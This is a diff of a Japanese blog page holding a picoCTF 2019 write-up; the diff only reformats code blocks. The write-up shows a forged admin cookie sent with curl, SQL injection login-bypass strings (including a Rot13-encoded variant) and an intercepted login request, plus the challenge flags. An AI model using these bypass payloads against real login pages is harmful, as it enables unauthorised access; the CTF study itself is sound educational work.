@@ -48,7 +48,7 @@
 <meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ">
 <meta itemprop="datePublished" content="2019-10-13T12:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2019-10-13T12:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="562">
+<meta itemprop="wordCount" content="543">
 
 
 
@@ -190,15 +190,10 @@ Hints : Can cookies help you to get the flag?<br /></p>
 </blockquote>
 <p><br /></p>
 <h3 id="solution">Solution</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl -k -H &#39;Cookie: admin=True; time=1400&#39;  https://2019shell1.picoctf.com/problem/32249/flag
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
+<pre>
+curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
+</pre>
+<p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="web-exploitation-irish-name-repo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</h2>
@@ -213,23 +208,14 @@ Hints : The password is being filtered.</p>
 <h3 id="solution-1">Solution</h3>
 <p>picoCTF 2018のVaultと同じ問題です。</p>
 <p>デバッグを見ようとして、以下を入れたら、Flag取れちゃった。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">username
-&#39; /*
+<pre>
+username
+' /*
 
 password
-*/ or 3=3 -- &amp;debug=1
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
+*/ or 3=3 -- &debug=1
+</pre>
+<p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <h2 id="web-exploitation-irish-name-repo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</h2>
@@ -243,24 +229,8 @@ Hints : Seems like the password is encrypted.</p>
 <p><br /></p>
 <h3 id="solution-2">Solution</h3>
 <p>Burpでやったらdebug変数が見えたので、1に変えてみました。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">POST /problem/12271/login.php HTTP/1.1
+<pre>
+POST /problem/12271/login.php HTTP/1.1
 Host: 2019shell1.picoctf.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -272,40 +242,24 @@ Connection: close
 Referer: https://2019shell1.picoctf.com/problem/12271/login.html
 Upgrade-Insecure-Requests: 1
 
-password=admin&amp;debug=1
-</code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">password: admin
-SQL query: SELECT * FROM admin where password = &#39;nqzva&#39;
-</code></pre></td></tr></table>
-</div>
-</div><p>&lsquo;nqzva&rsquo; は、&lsquo;admin&rsquo; のRot13ですね。</p>
+password=admin&debug=1
+</pre>
+<pre>
+password: admin
+SQL query: SELECT * FROM admin where password = 'nqzva'
+</pre>
+<p>&lsquo;nqzva&rsquo; は、&lsquo;admin&rsquo; のRot13ですね。</p>
 <p><br />
-いつものこの子を、</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39; or 1=1 --
-</code></pre></td></tr></table>
-</div>
-</div><p>Rot13して以下のようにします。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39; be 1=1 --
-</code></pre></td></tr></table>
-</div>
-</div><p>Flag: <code>picoCTF{3v3n_m0r3_SQL_ef7eac2f}</code></p>
+いつも使うこのパターンを、</p>
+<pre>
+' or 1=1 --
+</pre>
+<p>Rot13して以下のようにします。</p>
+<pre>
+' be 1=1 --
+</pre>
+<br>
+<p>Flag: <code>picoCTF{3v3n_m0r3_SQL_ef7eac2f}</code></p>
 <p><br /><br />
 <br /><br /></p>
 <hr>
